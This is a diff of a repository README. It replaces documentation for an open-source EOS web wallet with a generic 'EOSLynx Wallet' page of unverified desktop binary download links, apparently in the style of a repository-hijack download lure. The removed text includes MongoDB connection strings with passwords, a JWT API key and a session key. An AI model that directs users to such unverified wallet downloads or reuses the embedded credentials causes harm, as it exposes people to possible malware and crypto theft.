@@ -1,137 +1,145 @@
-# EOS Web Wallet &nbsp; [![Build Status](https://travis-ci.org/Tandemly/eos-web-wallet.svg?branch=develop)](https://travis-ci.org/Tandemly/eos-web-wallet)
+# 🐆 EOSLynx Wallet
 
-This is the web based wallet for EOS. The goal of the web wallet is to eventually be a multi-token wallet; but for now
-is aiming to support the most recent version of EOS with some basic wallet features.
+<div align="center">
 
-* Allow users to create a profile and login to the wallet
-* From within the wallet, users should be able to connect their EOS account
-* Allow users to update their wallet profile information
-* Once users have connected an EOS account, they can
-    * See their current EOS balance
-    * See their most recent transaction history
-    * Make a transfer of EOS to another EOS account
-* Allow users to disconnect an EOS account they've connected.
+### Your Gateway to the EOS Ecosystem
 
-## Environment & Requirements
-This web wallet assumes that there is an EOS network that you want to connect to and 
-an host running an instance of the [EOS API Service](https://github.com/Tandemly/eos-api-service) connected to that same EOS network.
+A modern desktop wallet designed for managing digital assets and exploring the EOS blockchain ecosystem.
 
+[![EOS](https://img.shields.io/badge/Blockchain-EOS-00C8D7?style=flat-square)](#)
+[![Platforms](https://img.shields.io/badge/Platforms-Windows%20%7C%20macOS%20%7C%20Linux-323D47?style=flat-square)](#downloads)
 
-The Web Wallet is a standard create-react-app React application with the addition 
-of its own Node server and database. It functions as a standalone web application 
-from a third-party point-of-view that would operate against the EOS platform.
+[**Downloads**](#downloads) • [**Features**](#features) • [**Security**](#security)
 
-Because of runtime dependencies needed for transaction buffer structures (related to ABIs), 
-the Wallet can not solely depend on the API alone for interacting with an existing EOS 
-blockchain network.  Signing transactions is done *only* on the client-side and key pairs 
-are never transmitted across the network or saved on a server (_the Wallet's or the API
-service_).
+</div>
 
-This is the basic environment the web wallet operates within:
+---
 
-![Wallet Environment](docs/Web-Wallet-EOS-Basic-Diagram.png?raw=true "Wallet Environment")
+## About EOSLynx
 
-### `eosd` Connector Host
-The Wallet will need a specific `eosd` "connector" or "read-only" node configured and 
-running, which will allow it to get the required transaction buffer structures at runtime 
-and perform required key checks when signing transactions.  That `eosd` node should be configured (_via the `config.ini` for eosd_) with the following settings:
+EOSLynx Wallet provides a modern and intuitive desktop experience for managing digital assets and interacting with the EOS blockchain ecosystem.
 
-```
-# The Access-Control-Allow-Origin http value
-access-control-allow-origin = *
+## Features
 
-# The Access-Control-Allow-Headers http value
-access-control-allow-headers = Content-Type
+- 🔐 Secure wallet management
+- ⚡ Clean and intuitive interface
+- 🌐 EOS blockchain integration
+- 💻 Cross-platform compatibility
+- 🎨 Modern desktop experience
 
-# true if Access-Control-Allow-Credentials: true should be specified in http response header
-access-control-allow-credentials = true
+---
 
-# MongoDB target host
-mongodb-uri = mongodb://eosdemo:eosdemo1234@ds111336.mlab.com:11336/eos-demo
+## <div align="center" id="downloads">Download EOSLynx Wallet</div>
 
-plugin = eosio::producer_plugin
-plugin = eosio::http_plugin
-plugin = eosio::chain_plugin
-plugin = eosio::db_plugin
-plugin = eosio::chain_api_plugin
-plugin = eosio::account_history_plugin
-plugin = eosio::account_history_api_plugin
-```
-With the use of the `db_plugin`, the mongo database setup to receive information from 
-this chain also becomes the source of information for the API services.  It is a shared 
-database and can be hosted and scaled to meet processing, user and network needs.
+<div align="center">
 
-See the [EOS repository](https://github.com/EOSIO/eos) for more information about setting up and running an `eosd` instance.
+Choose your platform to download EOSLynx Wallet.
 
-### EOS API Service
-The wallet will also need the [EOS API service](https://github.com/Tandemly/eos-api-service) 
-hosted somewhere and connected to the same `eosd` node and database as above. 
-The API service can be configured to point to the proper `eosd` node and mongo database 
-using the following settings in a local `.env` file. 
+<br/>
 
-Let's say our mongo database is available at `mongodb://db.company.com:27017` with a 
-userid of `eosdb`, password of `eosdb1234` and the database name is `EOS`. 
+<table width="100%">
+<tr>
+<td width="33%" align="center" valign="top">
 
-And our previous `eosd` "connector" node is available at `http://10.200.11.160:8888` 
-(_the `8888` is the default port for the `http_plugin`_).
+### 🪟 Windows
 
-The API Service's local `.env` file prior to building would then have the 
-following settings:
+<img src="https://img.shields.io/badge/WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Windows"/>
 
-```
-MONGO_URI=mongodb://eosdb:eosdb1234@db.company.com:27017/EOS
-EOSD_CONNECTOR_URI=http://10.200.11.160:8888
-```
+**Desktop Edition**
 
-<small>*Note: there should be no trailing slashes on any of the URIs*</small>
+Windows 10 / 11
 
-### Wallet Configuration
-With an `eosd` connector node and an API service running and available, we can now 
-configure and run the Wallet. The wallet is configured through a local `.env` file.  
-You can use the provided `.env.example` file to get started. 
+64-bit
 
-First, clone the application from the repo and create the local `.env` file:
+<br/>
 
-```bash
-$ git clone https://github.com/Tandemly/eos-web-wallet.git
-$ cd eos-web-wallet
-$ cp .env.example .env
-```
+<a href="../../releases/latest">
+<img src="https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows"/>
+</a>
 
-Given our setup above, our critical pieces in our local `.env` would be setup as follows.  
-Let's assume that our API server from the step above is running at http://10.200.11.161:3000. 
-We'll also assume that we've registered on the API server and requested an API key for our wallet to use.
+</td>
+<td width="33%" align="center" valign="top">
 
-Since the wallet needs its own database, we'll assume we've stood up a mongodb for the Wallet application to use at `mongodb://wallet:wallet123@10.200.11.170:27017` with a db named `Wallet`.
+### 🍎 macOS
 
-```
-REACT_APP_SASS=true
-REACT_APP_SASS_MODULES=true
-REACT_APP_CSS_MODULES=true
-NODE_PATH=src
-SESSION_KEY=0a905635f252cbea0185ab3767e23240
-REACT_APP_API_KEY=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1MTEzMjg2NTMsInN1YiI6IjVhMTUwYjQ4ZTBhMjFiMGFlZjRhYmM1NSIsImp0aSI6IiQyYSQxMCRDeG5CRS9ONENUdUs0bUZENnl4Ui9Pc044UXlLUUhSSFBMS2Fhc2IybDkwbWFkelc1OVlhaSIsInJvbGVzIjpbInVzZXIiXX0.AEi5Q0Wi6lnuy4euUghBTQ6nsBeZIhEWl4ujXo11It0
-REACT_APP_API_URI=http://10.200.11.161:3000
-REACT_APP_EOSD_URI=http://10.200.11.160:8888
-MONGO_URI=mongodb://wallet:wallet123@10.200.11.170:27017/wallet
-```
-<small>*Note: there should be no trailing slashes on any of the URIs*</small>
+<img src="https://img.shields.io/badge/macOS-333333?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"/>
 
-The `SESSION_KEY` is used by the wallet app to handle encrypted session cookies for tracking information about the user's session when logged into the Wallet app. This can be generated using `md5` or a similar method.
+**Desktop Edition**
 
-The `REACT_APP_API_KEY` is the api key we got from the API server after registering and requesting one via the `/v1/auth/request-api-key` endpoint.
+Apple Mac
 
-The other settings are simply pointing the Wallet application at the correct hosts to facilitate communicating with the EOS network via the API and the `eosd` connector node setup before.
+Intel / Apple Silicon*
 
-### Running the Wallet
-Once the environment is setup and your `.env` file is configured correctly, you can simply run the application using the following commands:
+<br/>
 
-```bash
-$ yarn 
-$ yarn build
-$ yarn start
-```
+<a href="../../releases/latest">
+<img src="https://img.shields.io/badge/Download%20for%20macOS-333333?style=for-the-badge&logo=apple&logoColor=white" alt="Download macOS"/>
+</a>
 
-With the wallet running, the interactions in the environment operate as in the following diagram:
+</td>
+<td width="33%" align="center" valign="top">
 
-![Wallet Annotated](docs/Web-Wallet-EOS-Annotated-Diagram.png?raw=true)
+### 🐧 Linux
+
+<img src="https://img.shields.io/badge/LINUX-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Linux"/>
+
+**Desktop Edition**
+
+Linux Distributions
+
+64-bit
+
+<br/>
+
+<a href="../../releases/latest">
+<img src="https://img.shields.io/badge/Download%20for%20Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Download Linux"/>
+</a>
+
+</td>
+</tr>
+</table>
+
+<br/>
+
+[![All Releases](https://img.shields.io/badge/VIEW%20ALL%20RELEASES-00C8D7?style=for-the-badge)](../../releases)
+
+</div>
+
+<sub>*Download availability depends on the packages provided in each release. Check release notes for supported architectures.</sub>
+
+---
+
+## Installation
+
+1. Visit the Downloads section.
+2. Select your operating system.
+3. Download the latest available version.
+4. Follow the installation instructions.
+5. Launch EOSLynx Wallet.
+
+## Security
+
+- Download software only from the official repository.
+- Keep your wallet software updated.
+- Never share your private keys or recovery phrase.
+- Verify release information before installation.
+
+## Support
+
+- [Report an Issue](../../issues)
+- [Latest Releases](../../releases)
+- [EOSLynx Foundation](https://github.com/eoslynx-foundation)
+
+---
+
+<div align="center">
+
+### EOSLynx Foundation
+
+Building a modern experience for the EOS ecosystem.
+
+**EOSLynx Wallet**
+
+*Simple. Modern. Connected.*
+
+</div>
